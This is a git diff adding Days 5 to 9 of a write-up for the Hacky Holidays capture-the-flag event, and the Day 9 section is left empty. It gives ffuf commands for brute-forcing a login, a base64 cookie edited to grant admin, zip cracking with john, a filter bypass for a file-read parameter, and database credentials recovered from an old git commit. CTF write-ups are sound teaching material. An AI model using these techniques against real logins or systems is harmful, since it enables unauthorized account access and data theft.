@@ -54,7 +54,8 @@ By decoding in Base64 the ID parameter : ```echo 'eyJpZCI6Mn0=' | base64 -d ``` 
 In this kind of case, authorization vulnerabilities may exist, so I try to change ```{"id":2}``` to ```{"id":1}```.  
 All encoded in base64, we get access to **The Grinch** user information details !   
 
-![cf_array](./images/flag3.png)
+![cf_array](./images/flag3.png)  
+
 
 FLAG 3 : flag{b705fb11-fb55-442f-847f-0931be82ed9a}
 
@@ -133,4 +134,181 @@ Now, you just have to request ```/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-F
 ```
 
 ## Day 5 - Secure Login
+
+On this app, main goal is : 
+> Try and find a way past the login page to get to the secret area.
+
+We just have a login interface : 
+
+![cf_array](./images/5-secure-login.png) 
+  
+After a few attempts to bypass the authentication, I started a phase of brute force on the login interface.  
+**FFUF again !!**
+
+To be able to retrieve the username, I used :  
+```
+ffuf -X POST -u https://hackyholidays.h1ctf.com/secure-login -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=grinch" -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -fr 'Invalid Username'
+```
+
+And to be able to retrieve the password, I used :   
+```
+ffuf -X POST -u https://hackyholidays.h1ctf.com/secure-login -H "Content-Type: application/x-www-form-urlencoded" -d "username=access&password=FUZZ" -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt -fc 200
+```
+
+We are then able to log in with the credentials  : **username=access&password=computer**  
+
+Once logged in, we get a session cookie :  ```eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=```
+By decoding it, we can see that it is a user whose role is not admin : 
+```
+echo 'eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=' | base64 -d  
+
+{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
+```
+
+I just have to change **false** to **true** and encode the new cookie :   
+
+```
+echo '{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}' | base64
+
+eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQo=
+```
+
+We get admin access to the application :  
+
+![cf_array](./images/5-admin-access.png) 
+
+I finally retrieve the .zip file but this one is protected by a password, so I used the following commands to break the password : 
+
+```
+zip2john  my_secure_files_not_for_you.zip > hash.txt
+
+john --wordlist=/usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt hash.txt
+```
+
+Password : **hahahaha**
+
+Inside flag.txt => FLAG : flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
+
+## Day 6 - My Diary
+
+On this app, main goal is : 
+> Hackers! It looks like the Grinch has released his Diary on Grinch Networks. We know he has an upcoming event but he hasn't posted it on his calendar. Can you hack his diary and find out what it is ?
+
+We arrive on the url : https://hackyholidays.h1ctf.com/my-diary/?template=entries.html
+
+![cf_array](./images/6-calendar.png)
+
+By making an enumeration on the **template** parameter, we find an existing page: **index.php**, inside it, we find the following source code :  
+```
+<?php
+if( isset($_GET["template"])  ){
+    $page = $_GET["template"];
+    //remove non allowed characters
+    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
+    //protect admin.php from being read
+    $page = str_replace("admin.php","",$page);
+    //I've changed the admin file to secretadmin.php for more security!
+    $page = str_replace("secretadmin.php","",$page);
+    //check file exists
+    if( file_exists($page) ){
+       echo file_get_contents($page);
+    }else{
+        //redirect to home
+        header("Location: /my-diary/?template=entries.html");
+        exit();
+    }
+}else{
+    //redirect to home
+    header("Location: /my-diary/?template=entries.html");
+    exit();
+}
+```
+
+We can see that the function **str_replace** is called twice in order to filter some patterns.  
+
+```
+- $page = str_replace("admin.php","",$page);  
+- $page = str_replace("secretadmin.php","",$page);  
+```
+
+All we have to do is set up two bypasses to bypass this protection !  
+The final request is therefore : ```/my-diary/?template=secretadsecretadmiadmin.phpn.phpmin.php```   
+
+**FLAG : flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}**
+
+## Day 7 - Hate Email Generator
+
+We are informed that :
+> Sending letters is so slow! Now the grinch sends his hate mail by email campaigns! Try and find the hidden flag!
+
+We then get an interface with the old campaigns carried out :   
+
+![cf_array](./images/7-previous.png)
+
+On this url ```https://hackyholidays.h1ctf.com/hate-mail-generator/91d45040151b681549d82d8065d43030```, we get details : 
+
+![cf_array](./images/7-campagns.png)
+
+First, we can see that HTML templates are called, I decide to fuzz the directories and I get the /templates/ directory, inside it, several templates are present : 
+
+```
+../
+cbdj3_grinch_header.html                                     20-Apr-2020 10:00                   -
+cbdj3_grinch_footer.html                                     20-Apr-2020 10:00                   -
+38dhs_admins_only_header.html                                21-Apr-2020 15:29                  46
+```
+
+Second, we can see that the mail generation engine uses template variables in order to dynamically fill the sent mails.  
+We can write our template and generate a preview before sending the campaign. By generating our template using the variable **name** previously called, we are able to have the template reserved for administrators interpreted !   
+
+![cf_array](./images/7-flag.png)
+
+**FLAG : flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}**
+
+## Day 8 - Forum
+
+We have the description of the challenge :  
+> The Grinch thought it might be a good idea to start a forum but nobody really wants to chat to him. He keeps his best posts in the Admin section but you'll need a valid login to access that !   
+
+The first page looks like this :   
+
+![cf_array](./images/8-home.png)
+
+By clicking on the button **Login**, we arrive on a connection interface. Nothing interesting here.  
+Searching on the forum, you won't find anything interesting either.   
+
+By fuzzing the directories of the forum, we find the **/phpmyadmin** being exposed on internet ! But we don't have the credentials.  
+
+I decide to embark on a phase of OSINT and to find the author of the forum !   
+
+By searching on github, I find the source code of the forum :  https://github.com/Grinch-Networks/forum  
+
+One technique is to look through the commits in the directory to see if there are any secrets that have not been added or removed. We find a commit containing login credentials to the forum database ! 
+
+```
+self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
+```
+
+we get access to the database exposed on /phpmyadmin : 
+
+![cf_array](./images/8-phpmyadmin.png)
+
+The login credentials of the user **grinch** seems interesting thanks to his administrator role : ```grinch:35D652126CA1706B59DB02C93E0C9FBF```  
+The password being an MD5 hash, we find the password in clear : ```BahHumbug``` and we obtain an admin access on the application : 
+
+![cf_array](./images/8-secret-plans.png)
+
+And finally got the flag :   
+
+![cf_array](./images/8-flag.png)
+
+**FLAG : flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}**
+
+## Day 9 - Evil Quiz
+
+We have the description of the challenge :  
+> Just how evil are you? Take the quiz and see! Just don't go poking around the admin area !
+  
+
+
 
